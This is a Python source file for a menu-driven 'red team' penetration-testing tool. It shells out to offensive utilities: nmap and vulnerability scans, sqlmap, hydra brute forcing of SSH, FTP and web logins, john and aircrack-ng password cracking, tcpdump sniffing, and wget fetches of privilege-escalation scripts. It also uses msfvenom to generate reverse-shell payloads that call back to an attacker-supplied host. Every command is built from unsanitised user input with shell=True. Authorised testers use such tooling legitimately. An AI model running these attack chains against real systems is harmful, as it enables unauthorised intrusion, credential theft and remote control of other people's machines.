import subprocess
import re
import time
from colorama import Fore, Back, Style, init
from tabulate import tabulate

# Initialize colorama
init(autoreset=True)

# Global variables to store scan data
active_hosts = []
hosts_with_ports = {}
target = ""

def display_banner():
    banner = f"""
{Fore.CYAN}{'='*70}
{Fore.YELLOW}       ___   ________  ______  ___    ___       _____ ________    _   __
{Fore.YELLOW}      /   | / ____/ / / /  _/ / _ \\  /   |     / ___// ____/   |  / | / /
{Fore.YELLOW}     / /| |/ /   / /_/ // /  / , _/ / /| |     \\__ \\/ /   / /| | /  |/ /
{Fore.YELLOW}    / ___ / /___/ __  // /  / /| | / ___ |    ___/ / /___/ ___ |/ /|  /
{Fore.YELLOW}   /_/  |_\\____/_/ /_/___/ /_/ |_|/_/  |_|   /____/\\____/_/  |_/_/ |_/
{Fore.CYAN}{'='*70}
{Fore.RED}              Red Team Automation & Penetration Testing Tool
{Fore.CYAN}{'='*70}
{Style.RESET_ALL}"""
    print(banner)

def display_menu():
    menu = f"""
{Fore.CYAN}{'='*70}
{Fore.YELLOW}                        MAIN ATTACK MENU
{Fore.CYAN}{'='*70}

{Fore.GREEN}[RECONNAISSANCE & SCANNING]
{Fore.CYAN}  1.  Network Discovery (netdiscover)
{Fore.CYAN}  2.  Host Discovery (nmap ping scan)
{Fore.CYAN}  3.  Port Scanning (nmap full scan)
{Fore.CYAN}  4.  Service Version Detection (nmap -sV)
{Fore.CYAN}  5.  OS Detection (nmap -O)
{Fore.CYAN}  6.  Vulnerability Scan (nmap --script vuln)

{Fore.GREEN}[WEB APPLICATION ATTACKS]
{Fore.CYAN}  7.  Directory Brute Force (gobuster)
{Fore.CYAN}  8.  Web Vulnerability Scan (nikto)
{Fore.CYAN}  9.  SQL Injection Test (sqlmap)
{Fore.CYAN}  10. SSL/TLS Analysis (sslscan)
{Fore.CYAN}  11. Web Fuzzing (wfuzz)

{Fore.GREEN}[EXPLOITATION]
{Fore.CYAN}  12. Metasploit Auto-Exploit (searchsploit + msfconsole)
{Fore.CYAN}  13. Brute Force Attack (hydra - SSH/FTP/HTTP)
{Fore.CYAN}  14. Password Cracking (john the ripper)
{Fore.CYAN}  15. Wireless Attack (aircrack-ng)

{Fore.GREEN}[ENUMERATION]
{Fore.CYAN}  16. SMB Enumeration (enum4linux)
{Fore.CYAN}  17. DNS Enumeration (dnsenum)
{Fore.CYAN}  18. SNMP Enumeration (snmp-check)
{Fore.CYAN}  19. Web Technology Detection (whatweb)

{Fore.GREEN}[POST-EXPLOITATION]
{Fore.CYAN}  20. Generate Reverse Shell (msfvenom)
{Fore.CYAN}  21. Privilege Escalation Check (linpeas/winpeas)
{Fore.CYAN}  22. Network Sniffing (tcpdump)

{Fore.GREEN}[AUTOMATED WORKFLOWS]
{Fore.CYAN}  23. Full Auto Scan (All reconnaissance)
{Fore.CYAN}  24. Web App Full Attack Chain
{Fore.CYAN}  25. Network Penetration Test

{Fore.RED}  0.  Exit

{Fore.CYAN}{'='*70}
{Style.RESET_ALL}"""
    print(menu)

def get_target():
    global target
    if not target:
        target = input(f"{Fore.CYAN}Enter target IP/network (e.g., 192.168.1.100 or 192.168.1.0/24): {Style.RESET_ALL}")
    return target

# ============ RECONNAISSANCE FUNCTIONS ============

def network_discovery():
    print(f"\n{Fore.YELLOW}[*] Starting Network Discovery with netdiscover{Style.RESET_ALL}")
    t = get_target()
    cmd = f"sudo netdiscover -r {t} -P"
    try:
        output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        print(output.stdout)
    except:
        print(f"{Fore.YELLOW}[!] Scan completed{Style.RESET_ALL}")

def host_discovery():
    global active_hosts
    print(f"\n{Fore.YELLOW}[*] Starting Host Discovery{Style.RESET_ALL}")
    t = get_target()
    cmd = f"nmap -sn {t}"
    scan = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    active_hosts = []
    for line in scan.stdout.split('\n'):
        if 'Nmap scan report for' in line:
            match = re.search(r'\d+\.\d+\.\d+\.\d+', line)
            if match:
                active_hosts.append(match.group())
    
    if active_hosts:
        table_data = [[i+1, host] for i, host in enumerate(active_hosts)]
        print(f"\n{Fore.GREEN}[+] Found {len(active_hosts)} active host(s){Style.RESET_ALL}")
        print(tabulate(table_data, headers=[f"{Fore.CYAN}#", "IP Address"], tablefmt="grid"))
    else:
        print(f"{Fore.RED}[-] No hosts found{Style.RESET_ALL}")

def port_scanning():
    global hosts_with_ports
    print(f"\n{Fore.YELLOW}[*] Starting Full Port Scan{Style.RESET_ALL}")
    hosts = active_hosts if active_hosts else [get_target()]
    
    for h in hosts:
        print(f"{Fore.CYAN}[*] Scanning {h}...{Style.RESET_ALL}")
        cmd = f"nmap -T4 -p- {h}"
        scan = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        
        ports = []
        for line in scan.stdout.split('\n'):
            match = re.match(r'(\d+)/tcp\s+open\s+(\S+)', line)
            if match:
                ports.append((match.group(1), match.group(2)))
        
        if ports:
            hosts_with_ports[h] = ports
            print(f"{Fore.GREEN}[+] Found {len(ports)} open ports on {h}{Style.RESET_ALL}")

def service_detection():
    print(f"\n{Fore.YELLOW}[*] Starting Service Version Detection{Style.RESET_ALL}")
    hosts = active_hosts if active_hosts else [get_target()]
    
    for h in hosts:
        print(f"{Fore.CYAN}[*] Detecting services on {h}...{Style.RESET_ALL}")
        cmd = f"nmap -sV -T4 {h}"
        scan = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
        print(scan.stdout)

def os_detection():
    print(f"\n{Fore.YELLOW}[*] Starting OS Detection{Style.RESET_ALL}")
    hosts = active_hosts if active_hosts else [get_target()]
    
    results = []
    for h in hosts:
        print(f"{Fore.CYAN}[*] Detecting OS on {h}...{Style.RESET_ALL}")
        cmd = f"sudo nmap -O {h}"
        scan = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        
        os_info = "Unknown"
        for line in scan.stdout.split('\n'):
            if 'OS details:' in line or 'Running:' in line:
                os_info = line.strip().replace('OS details:', '').replace('Running:', '').strip()
                break
        results.append([h, os_info])
    
    print(f"\n{Fore.GREEN}[+] OS Detection Results{Style.RESET_ALL}")
    print(tabulate(results, headers=["IP", "Operating System"], tablefmt="grid"))

def vulnerability_scan():
    print(f"\n{Fore.YELLOW}[*] Starting Vulnerability Scan{Style.RESET_ALL}")
    hosts = active_hosts if active_hosts else [get_target()]
    
    for h in hosts:
        print(f"{Fore.CYAN}[*] Scanning {h} for vulnerabilities...{Style.RESET_ALL}")
        cmd = f"nmap --script vuln -T4 {h}"
        scan = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        print(scan.stdout)

# ============ WEB APPLICATION ATTACKS ============

def directory_bruteforce():
    print(f"\n{Fore.YELLOW}[*] Starting Directory Brute Force{Style.RESET_ALL}")
    t = get_target()
    url = input(f"{Fore.CYAN}Enter URL (e.g., http://{t}): {Style.RESET_ALL}") or f"http://{t}"
    
    cmd = f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -t 50"
    print(f"{Fore.CYAN}[*] Running gobuster...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def nikto_scan():
    print(f"\n{Fore.YELLOW}[*] Starting Nikto Web Vulnerability Scan{Style.RESET_ALL}")
    t = get_target()
    url = input(f"{Fore.CYAN}Enter URL (e.g., http://{t}): {Style.RESET_ALL}") or f"http://{t}"
    
    cmd = f"nikto -h {url}"
    print(f"{Fore.CYAN}[*] Running nikto...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def sqlmap_test():
    print(f"\n{Fore.YELLOW}[*] Starting SQL Injection Test{Style.RESET_ALL}")
    url = input(f"{Fore.CYAN}Enter vulnerable URL with parameter (e.g., http://target.com/page?id=1): {Style.RESET_ALL}")
    
    cmd = f"sqlmap -u '{url}' --batch --dbs"
    print(f"{Fore.CYAN}[*] Running sqlmap...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def ssl_scan():
    print(f"\n{Fore.YELLOW}[*] Starting SSL/TLS Analysis{Style.RESET_ALL}")
    t = get_target()
    
    cmd = f"sslscan {t}"
    print(f"{Fore.CYAN}[*] Running sslscan...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def web_fuzzing():
    print(f"\n{Fore.YELLOW}[*] Starting Web Fuzzing{Style.RESET_ALL}")
    t = get_target()
    url = input(f"{Fore.CYAN}Enter URL with FUZZ keyword (e.g., http://{t}/FUZZ): {Style.RESET_ALL}")
    
    cmd = f"wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {url}"
    print(f"{Fore.CYAN}[*] Running wfuzz...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

# ============ EXPLOITATION ============

def metasploit_auto():
    print(f"\n{Fore.YELLOW}[*] Metasploit Auto-Exploit{Style.RESET_ALL}")
    t = get_target()
    service = input(f"{Fore.CYAN}Enter service to exploit (e.g., vsftpd, samba): {Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}[*] Searching exploits...{Style.RESET_ALL}")
    cmd = f"searchsploit {service}"
    subprocess.run(cmd, shell=True)
    
    print(f"\n{Fore.YELLOW}[!] Launch msfconsole manually for exploitation{Style.RESET_ALL}")

def brute_force_attack():
    print(f"\n{Fore.YELLOW}[*] Starting Brute Force Attack{Style.RESET_ALL}")
    t = get_target()
    
    print(f"\n{Fore.CYAN}Select service:")
    print(f"  1. SSH (port 22)")
    print(f"  2. FTP (port 21)")
    print(f"  3. HTTP (web login)")
    choice = input(f"Choice: {Style.RESET_ALL}")
    
    username = input(f"{Fore.CYAN}Enter username: {Style.RESET_ALL}")
    wordlist = input(f"{Fore.CYAN}Enter wordlist path (default: /usr/share/wordlists/rockyou.txt): {Style.RESET_ALL}") or "/usr/share/wordlists/rockyou.txt"
    
    if choice == "1":
        cmd = f"hydra -l {username} -P {wordlist} ssh://{t}"
    elif choice == "2":
        cmd = f"hydra -l {username} -P {wordlist} ftp://{t}"
    elif choice == "3":
        path = input(f"{Fore.CYAN}Enter login path (e.g., /login.php): {Style.RESET_ALL}")
        cmd = f"hydra -l {username} -P {wordlist} {t} http-post-form '{path}:username=^USER^&password=^PASS^:F=incorrect'"
    
    print(f"{Fore.CYAN}[*] Running hydra...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def password_cracking():
    print(f"\n{Fore.YELLOW}[*] Password Cracking with John the Ripper{Style.RESET_ALL}")
    hash_file = input(f"{Fore.CYAN}Enter hash file path: {Style.RESET_ALL}")
    
    cmd = f"john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}"
    print(f"{Fore.CYAN}[*] Running john...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def wireless_attack():
    print(f"\n{Fore.YELLOW}[*] Wireless Attack with Aircrack-ng{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] This requires wireless adapter in monitor mode{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}1. Put interface in monitor mode")
    print(f"2. Capture handshake")
    print(f"3. Crack password")
    choice = input(f"Choice: {Style.RESET_ALL}")
    
    if choice == "1":
        interface = input(f"{Fore.CYAN}Enter interface (e.g., wlan0): {Style.RESET_ALL}")
        subprocess.run(f"sudo airmon-ng start {interface}", shell=True)
    elif choice == "2":
        interface = input(f"{Fore.CYAN}Enter monitor interface (e.g., wlan0mon): {Style.RESET_ALL}")
        subprocess.run(f"sudo airodump-ng {interface}", shell=True)
    elif choice == "3":
        cap_file = input(f"{Fore.CYAN}Enter capture file: {Style.RESET_ALL}")
        subprocess.run(f"aircrack-ng -w /usr/share/wordlists/rockyou.txt {cap_file}", shell=True)

# ============ ENUMERATION ============

def smb_enumeration():
    print(f"\n{Fore.YELLOW}[*] SMB Enumeration{Style.RESET_ALL}")
    t = get_target()
    
    cmd = f"enum4linux -a {t}"
    print(f"{Fore.CYAN}[*] Running enum4linux...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def dns_enumeration():
    print(f"\n{Fore.YELLOW}[*] DNS Enumeration{Style.RESET_ALL}")
    domain = input(f"{Fore.CYAN}Enter domain name: {Style.RESET_ALL}")
    
    cmd = f"dnsenum {domain}"
    print(f"{Fore.CYAN}[*] Running dnsenum...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def snmp_enumeration():
    print(f"\n{Fore.YELLOW}[*] SNMP Enumeration{Style.RESET_ALL}")
    t = get_target()
    
    cmd = f"snmp-check {t}"
    print(f"{Fore.CYAN}[*] Running snmp-check...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

def web_tech_detection():
    print(f"\n{Fore.YELLOW}[*] Web Technology Detection{Style.RESET_ALL}")
    t = get_target()
    url = input(f"{Fore.CYAN}Enter URL (e.g., http://{t}): {Style.RESET_ALL}") or f"http://{t}"
    
    cmd = f"whatweb {url}"
    print(f"{Fore.CYAN}[*] Running whatweb...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

# ============ POST-EXPLOITATION ============

def generate_reverse_shell():
    print(f"\n{Fore.YELLOW}[*] Generate Reverse Shell with msfvenom{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}Select payload type:")
    print(f"  1. Linux x64")
    print(f"  2. Windows x64")
    print(f"  3. PHP")
    print(f"  4. Python")
    choice = input(f"Choice: {Style.RESET_ALL}")
    
    lhost = input(f"{Fore.CYAN}Enter your IP (LHOST): {Style.RESET_ALL}")
    lport = input(f"{Fore.CYAN}Enter port (LPORT, default 4444): {Style.RESET_ALL}") or "4444"
    output = input(f"{Fore.CYAN}Enter output filename: {Style.RESET_ALL}")
    
    if choice == "1":
        cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}"
    elif choice == "2":
        cmd = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
    elif choice == "3":
        cmd = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {output}"
    elif choice == "4":
        cmd = f"msfvenom -p python/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output}"
    
    print(f"{Fore.CYAN}[*] Generating payload...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)
    print(f"{Fore.GREEN}[+] Payload saved to {output}{Style.RESET_ALL}")

def privilege_escalation():
    print(f"\n{Fore.YELLOW}[*] Privilege Escalation Check{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}Select OS:")
    print(f"  1. Linux (linpeas)")
    print(f"  2. Windows (winpeas)")
    choice = input(f"Choice: {Style.RESET_ALL}")
    
    if choice == "1":
        print(f"{Fore.CYAN}[*] Download and run linpeas.sh on target{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh{Style.RESET_ALL}")
    elif choice == "2":
        print(f"{Fore.CYAN}[*] Download and run winPEAS.exe on target{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe{Style.RESET_ALL}")

def network_sniffing():
    print(f"\n{Fore.YELLOW}[*] Network Sniffing with tcpdump{Style.RESET_ALL}")
    interface = input(f"{Fore.CYAN}Enter interface (e.g., eth0): {Style.RESET_ALL}")
    output = input(f"{Fore.CYAN}Enter output file (e.g., capture.pcap): {Style.RESET_ALL}")
    
    cmd = f"sudo tcpdump -i {interface} -w {output}"
    print(f"{Fore.CYAN}[*] Starting capture (Ctrl+C to stop)...{Style.RESET_ALL}")
    subprocess.run(cmd, shell=True)

# ============ AUTOMATED WORKFLOWS ============

def full_auto_scan():
    print(f"\n{Fore.GREEN}[*] Starting Full Automated Reconnaissance{Style.RESET_ALL}")
    network_discovery()
    time.sleep(2)
    host_discovery()
    time.sleep(2)
    if active_hosts:
        port_scanning()
        time.sleep(2)
        service_detection()
        time.sleep(2)
        os_detection()
        time.sleep(2)
        vulnerability_scan()
    print(f"\n{Fore.GREEN}[✓] Full scan complete!{Style.RESET_ALL}")

def web_app_attack_chain():
    print(f"\n{Fore.GREEN}[*] Starting Web Application Attack Chain{Style.RESET_ALL}")
    web_tech_detection()
    time.sleep(2)
    directory_bruteforce()
    time.sleep(2)
    nikto_scan()
    print(f"\n{Fore.GREEN}[✓] Web attack chain complete!{Style.RESET_ALL}")

def network_pentest():
    print(f"\n{Fore.GREEN}[*] Starting Network Penetration Test{Style.RESET_ALL}")
    host_discovery()
    time.sleep(2)
    if active_hosts:
        port_scanning()
        time.sleep(2)
        service_detection()
        time.sleep(2)
        vulnerability_scan()
        time.sleep(2)
        smb_enumeration()
    print(f"\n{Fore.GREEN}[✓] Network pentest complete!{Style.RESET_ALL}")

def main():
    display_banner()
    
    while True:
        display_menu()
        choice = input(f"{Fore.YELLOW}Select option: {Style.RESET_ALL}")
        
        try:
            if choice == "0":
                print(f"\n{Fore.YELLOW}Exiting... Stay safe!{Style.RESET_ALL}\n")
                break
            elif choice == "1":
                network_discovery()
            elif choice == "2":
                host_discovery()
            elif choice == "3":
                port_scanning()
            elif choice == "4":
                service_detection()
            elif choice == "5":
                os_detection()
            elif choice == "6":
                vulnerability_scan()
            elif choice == "7":
                directory_bruteforce()
            elif choice == "8":
                nikto_scan()
            elif choice == "9":
                sqlmap_test()
            elif choice == "10":
                ssl_scan()
            elif choice == "11":
                web_fuzzing()
            elif choice == "12":
                metasploit_auto()
            elif choice == "13":
                brute_force_attack()
            elif choice == "14":
                password_cracking()
            elif choice == "15":
                wireless_attack()
            elif choice == "16":
                smb_enumeration()
            elif choice == "17":
                dns_enumeration()
            elif choice == "18":
                snmp_enumeration()
            elif choice == "19":
                web_tech_detection()
            elif choice == "20":
                generate_reverse_shell()
            elif choice == "21":
                privilege_escalation()
            elif choice == "22":
                network_sniffing()
            elif choice == "23":
                full_auto_scan()
            elif choice == "24":
                web_app_attack_chain()
            elif choice == "25":
                network_pentest()
            else:
                print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Operation cancelled{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
